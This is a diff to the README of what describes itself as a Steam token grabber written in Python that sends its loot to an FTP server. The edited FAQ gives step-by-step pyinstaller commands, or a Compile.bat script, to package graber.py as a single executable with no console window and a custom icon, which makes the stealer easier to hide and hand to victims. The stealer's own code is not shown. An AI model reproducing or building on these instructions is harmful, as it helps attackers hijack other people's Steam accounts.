@@ -9,11 +9,12 @@ A steam token graber in python with ftp server
 # Faq
 
 ### How do I put it in .exe format ?
-Very simple 
-1 You install python [here](https://www.python.org/downloads/)   
-2 You run in a cmd <code>pip install pyinstaller</code>    
-3 <code>cd C:/your/path/where/is/your/folder </code>   
-4 <code>pyinstaller --onefile --noconsole --icon=icone.ico graber.py</code>   
+You have 2 options either you do that
+1. You install python [here](https://www.python.org/downloads/)   
+2. You run in a cmd <code>pip install pyinstaller</code>    
+3. <code>cd C:/your/path/where/is/your/folder </code>   
+4. <code>pyinstaller --onefile --noconsole --icon=icone.ico graber.py</code>    
+Or else run the Compile.bat
 
 ### What are the parameters of the last command ?
 <code>--onefile</code> for the .exe format   
